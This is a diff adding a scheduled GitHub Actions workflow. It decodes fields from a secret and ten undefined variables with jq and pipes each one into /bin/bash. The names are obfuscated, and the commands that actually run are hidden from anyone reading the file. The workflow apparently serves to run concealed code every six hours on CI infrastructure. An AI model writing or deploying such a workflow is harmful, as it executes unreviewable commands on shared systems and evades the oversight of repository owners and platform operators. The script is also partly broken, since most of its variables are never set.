@@ -1,0 +1,28 @@
+name: luanzhishen3187
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luanzhishen3187
+        env:
+          a8: ${{ secrets.a8 }}
+        run: |
+          echo $a8 | jq -r .ugmqf839 | /bin/bash
+          echo $y49333 | jq -r .cxr6726 | /bin/bash
+          echo $hvby59951 | jq -r .llrll986 | /bin/bash
+          echo $q064 | jq -r .knu70428 | /bin/bash
+          echo $tmm15 | jq -r .qqrtu891 | /bin/bash
+          echo $px01785 | jq -r .zjy9901 | /bin/bash
+          echo $ulmmw0133 | jq -r .qel52278 | /bin/bash
+          echo $n46037 | jq -r .nrd25797 | /bin/bash
+          echo $csrn8689 | jq -r .juru5447 | /bin/bash
+          echo $kyrwy432 | jq -r .txbcy11 | /bin/bash
+          echo $s2 | jq -r .lky357 | /bin/bash
+
